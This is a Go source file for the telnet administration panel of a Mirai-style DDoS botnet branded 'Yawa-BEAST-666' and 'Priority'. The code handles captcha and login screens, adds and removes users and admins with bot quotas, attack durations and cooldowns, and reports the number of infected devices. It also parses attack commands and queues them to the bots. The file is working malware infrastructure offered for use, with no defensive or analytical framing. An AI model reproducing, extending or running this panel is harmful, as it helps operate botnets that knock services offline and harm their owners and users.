package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
	"math/rand"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
    
	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Yawa-BEAST-666 :> | Human Verification\007"))); err != nil {
		this.conn.Close()
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/
	
	var code int
	code = (rand.Intn(9)+1)*1000 + (rand.Intn(9)+1)*100 + (rand.Intn(9)+1)*10 + rand.Intn(10)
	this.conn.SetDeadline(time.Now().Add(20 * time.Second))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[0mPlease Enter The Given Captcha Code.\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95mCaptcha - \033[00;1;96m" + strconv.Itoa(code) + "\033[0m: "))
	pin, err := this.ReadLine(false)
	this.conn.Write([]byte("\033[0m\r\n"))

	if err != nil || len(pin) != 4 {
		this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	cc, err := strconv.Atoi(pin)
	if err != nil || cc != code {
		this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	
    /*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte(fmt.Sprintf("\033]0; Yawa-BEAST-666 :> | Enter Username\007")))
	this.conn.SetDeadline(time.Now().Add(15 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
	this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - Please Enter You\033[00;1;96mr \033[34mUser\033[00;1;96m And \033[34mPass\033[00;1;96m! - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║Please Wait \033[34m10 Mins\033[00;1;96m After A Logout To Log Back In.\033[0m\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                                   \033[00;1;96m║\033[00;1;95mUsername\033[0m:\033[00;1;95m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte(fmt.Sprintf("\033]0; Yawa-BEAST-666 :> | Enter Password\007")))
	this.conn.SetDeadline(time.Now().Add(15 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
	this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - Please Enter You\033[00;1;96mr \033[34mUser\033[00;1;96m And \033[34mPass\033[00;1;96m! - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                                   \033[00;1;96m║\033[00;1;95mPassword\033[0m:\033[00;1;95m "))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if len(password) > 300 || len(username) > 50 {
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte(fmt.Sprintf("\033]0; Yawa-BEAST-666 :> | Loading\007")))
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\033[0m\r\n"))
	for i := 0; i < 100; i = i + 1 {
		lol := "%"
		this.conn.Write([]byte("\033[2J\033[1H"))
		fmt.Fprintf(this.conn, "\033[00;1;95mLoading [\033[00;1;96m%d%s\033[00;1;95m]\r\n", i, lol)
		time.Sleep(time.Millisecond * 30)
		fmt.Fprint(this.conn, "\033[2J\033[1;1H")
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;31mIncorrect Login\r\n"))
        this.conn.Write([]byte("\r\x1b[0;32mTo Exit, press any key...\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
	
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃  \r\n"))
	this.conn.Write([]byte("\033[0;39m  ⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿ \r\n"))
    this.conn.Write([]byte("\033[0;31m  Best in L4 [L7-GOOD] Yawa-BEAST-666 BY : [CABS] 30 METHODS :> PRIVATE v1         \r\n"))
	this.conn.Write([]byte("\r\n")) 
	
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;[%d] Devices | User:  [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;31m" + username + "\x1b[1;37m>\033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃  \r\n"))
    this.conn.Write([]byte("\033[0;39m ⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃  \r\n"))
	this.conn.Write([]byte("\033[0;39m  ⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠ \r\n"))
    this.conn.Write([]byte("\033[0;39m  ⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿ \r\n"))
    this.conn.Write([]byte("\033[0;31m  Best in L4 [L7-GOOD] Yawa-BEAST-666 BY : [CABS] 30 METHODS :> PRIVATE v1          \r\n"))
	this.conn.Write([]byte("\r\n")) 
			continue
		}
 
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m Enter New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m Enter Max Bot Count (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m \x1b[0;31m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m \x1b[0;31m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m \x1b[0;31m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[0;31m-\x1b[0;31m>\x1b[0;31m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }
		if userInfo.admin == 1 && cmd == "addadm" {
            this.conn.Write([]byte("\033[0mAdmin User's Username:\033[1;31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mAdmin User's Password:\033[1;31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mAdmin User's Botcount\033[1;31m(\033[0m-1 for access to all\033[1;31m)\033[0m:\033[1;31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAdmin User's Attack Duration\033[1;31m(\033[0m-1 for none\033[1;31m)\033[0m:\033[1;31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mAdmin User's Cooldown\033[1;31m(\033[0m0 for none\033[1;31m)\033[0m:\033[1;31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New admin user's  info - \r\n- Username - \033[1;31m" + new_un + "\r\n\033[0m- Password - \033[1;31m" + new_pw + "\r\n\033[0m- Bots - \033[1;31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;31m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;31m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mAdmin User's  added successfully.\033[0m\r\n"))
            }
            continue
        }
		if userInfo.admin == 1 && cmd == "remuser" {
            this.conn.Write([]byte("\033[1;31mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[1;31mAre You Sure You Want To Remove \033[1;31m" + rm_un + "?\033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;97mUnable to remove users, sorry pal (`-`)\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }
		
		if err != nil || cmd == "admin" || cmd == "ADMIN" {
    this.conn.Write([]byte("\x1b[38;5;91m╔═══════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║ \x1b[38;5;214madduser \x1b[38;5;91m|\x1b[38;5;214m Add a normal user   \x1b[38;5;91m║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║ \x1b[38;5;214maddadm  \x1b[38;5;91m|\x1b[38;5;214m Add a admin account \x1b[38;5;91m║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m║ \x1b[38;5;214mremuser \x1b[38;5;91m|\x1b[38;5;214m remove a user       \x1b[38;5;91m║\r\n"))
    this.conn.Write([]byte("\x1b[38;5;91m╚═══════════════════════════════╝\r\n"))

    continue
}
		 if err != nil || cmd == "help" || cmd == "HELP" { // display help menu
            this.conn.Write([]byte("\033[0;39m ╔══════════════════════════════════════════╗   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[0;39m ║ \033[0;39m? \033[0;36m- \033[01;37mShows \033[0;31mAttack Commands         \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[0;39m ║ \033[0;39mBOTS \033[0;36m- \033[01;37mShows \033[0;31mLoaded Bot List             \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[0;39m ║ \033[0;39mINFO \033[0;36m- \033[01;37mShows \033[0;31mCurrent Net Info            \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[0;39m ║ \033[0;39mClear or CLS \033[0;36m- \033[01;37mClears \033[0;31mYour Screen            \033[01;36m║   \x1b[0m \r\n"))
            this.conn.Write([]byte("\033[0;39m ╚══════════════════════════════════════════╝ \x1b[0m \r\n"))
            continue
        }
		if err != nil || cmd == "INFO" || cmd == "info" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[0;39m ═══════════════════════════════  \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;31m  \033[0;39mLogged In As: \033[0;36m" + username + "          \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;31m  \033[0;39mDeveloped By \033[0;31m@CABS                 \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[0;31m  \033[0;39mDATE MADE: \033[0;31m3/3/2021                        \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[0;39m ═══════════════════════════════  \r\n")))
            continue
        }
        if cmd == "logout" || cmd == "LOGOUT" {
            return
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s: \x1b[0;31m%d\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[0;33mtotal.botcount: \x1b[0;32m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[0;31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
